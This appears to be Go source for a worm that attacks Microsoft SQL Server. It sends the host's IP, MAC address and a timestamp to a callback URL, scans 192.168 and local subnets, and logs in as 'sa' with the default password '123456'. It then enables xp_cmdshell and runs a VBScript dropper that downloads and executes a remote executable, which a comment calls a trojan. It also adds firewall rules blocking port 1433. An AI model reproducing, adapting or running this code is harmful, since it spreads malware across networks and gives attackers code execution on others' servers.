package main

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func CloseMssql() {
	// 防火墙拒绝1433连接
	exec.Command(`netsh advfirewall firewall add rule name = "Disable port 1433 - TCP" dir = in action = block protocol = TCP localport = 1433`)
	exec.Command(`netsh advfirewall firewall add rule name = "Disable port 1433 - TCP" dir = in action = block protocol = UDP localport = 1433`)
}
func GetLocalIp() string {
	// 获取本地IP
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		os.Stderr.WriteString("Oops:" + err.Error())
		os.Exit(1)
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "null"

}
func mac() string {
	// 获取本机的MAC地址
	interfaces, err := net.Interfaces()
	if err != nil {
		panic("Error : " + err.Error())
	}
	for _, inter := range interfaces {
		mac := inter.HardwareAddr //获取本机MAC地址
		return mac.String()
	}
	return "null"
}

func SendInfo(s string) {
	// 向服务器回传信息，第一步咯
	input := []byte(s)
	ip := base64.StdEncoding.EncodeToString(input)
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	ff := []byte(timestamp)
	time := base64.StdEncoding.EncodeToString(ff)
	_mac := base64.StdEncoding.EncodeToString([]byte(mac()))
	url := "http://localhost/callback?ip=" + ip + "&time=" + string(time) + "&mac=" + _mac // 回传信息
	resp, err := http.Get(url)
	if err != nil {
		// handle error
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}

	fmt.Println(string(body))
}

func MakeIp() {
	var ip string
	for c := 0; c <= 255; c++ {
		for d := 0; d <= 255; d++ {
			ip = "192.168." + strconv.Itoa(c) + "." + strconv.Itoa(d)
			Open(ip)   //开启xp_cmdshell
			Attack(ip) // 执行exploit 下载"木马"
		}
	}
}

func SNscan() {
	Selfip := GetLocalIp()
	println(Selfip)
	s := strings.Split(Selfip, ".")
	var ip string
	for i := 0; i <= 255; i++ {
		ip = s[0] + "." + s[1] + "." + s[2] + "." + strconv.Itoa(i)
		Open(ip)
		Attack(ip)
	}
}

func Open(ip string) {

	conn, err := sql.Open("odbc", "driver={SQL Server};SERVER="+ip+";UID=sa;PWD=123456;DATABASE=master")
	if err != nil {
		//fmt.Println("Connecting Error")
		return
	}
	defer conn.Close()
	stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
	if err != nil {
		//fmt.Println("Query Error", err)
		return
	}
	defer stmt.Close()
	stmt.Query()
	return

}

func Attack(ip string) {
	conn, err := sql.Open("odbc", "driver={SQL Server};SERVER="+ip+";UID=sa;PWD=123456;DATABASE=master")
	if err != nil {
		//fmt.Println("Connecting Error")
		return
	}
	defer conn.Close()
	// payload  在里面修改下载地址
	var exploit = `echo Set Post = CreateObject("Msxml2.XMLHTTP") >>zl.vbs && echo Set Shell = CreateObject("Wscript.Shell") >>zl.vbs && echo Post.Open "GET","https://remote/1.exe",0 >>zl.vbs && echo Post.Send() >>zl.vbs && echo Set aGet = CreateObject("ADODB.Stream") >>zl.vbs && echo aGet.Mode = 3 >>zl.vbs && echo aGet.Type = 1 >>zl.vbs && echo aGet.Open() >>zl.vbs && echo aGet.Write(Post.responseBody) >>zl.vbs && echo aGet.SaveToFile "zl.exe",2 >>zl.vbs && echo wscript.sleep 1000 >>zl.vbs && echo Shell.Run ("zl.exe") >>zl.vbs && cscript zl.vbs`
	stmt, err := conn.Prepare(`exec master..xp_cmdshell '` + exploit + `' `)
	if err != nil {
		//fmt.Println("Query Error", err)
		return
	}
	defer stmt.Close()
	stmt.Query()
	return

}
